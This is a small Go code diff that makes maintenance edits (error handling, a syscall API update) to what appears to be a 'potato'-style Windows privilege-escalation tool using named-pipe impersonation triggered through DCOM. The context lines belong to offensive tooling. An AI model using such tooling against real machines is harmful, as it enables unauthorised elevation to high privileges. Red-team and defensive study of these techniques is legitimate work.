@@ -123,7 +123,7 @@ func namedPipeImpersonateWithTrigger(cmd, pipeName string, trigger func(string) 
 	if err != nil {
 		return "", fmt.Errorf("create pipe: %w", err)
 	}
-	defer syscallNtCloseHandle(sm, handle)
+	defer func() { _ = syscallNtCloseHandle(sm, handle) }()
 
 	errCh := make(chan error, 1)
 	go func() {
@@ -350,7 +350,7 @@ func triggerDCOM(pipeName string) error {
 		if hr == 0 && pUnknown != 0 {
 			debugLog(fmt.Sprintf("[potato] DCOM activated CLSID %s", clsidStr))
 			vtable := *(*[3]uintptr)(unsafe.Pointer(pUnknown))
-			syscall.Syscall(vtable[2], 1, pUnknown, 0, 0)
+			syscall.SyscallN(vtable[2], pUnknown, 0, 0)
 			triggered = true
 			time.Sleep(2 * time.Second)
 
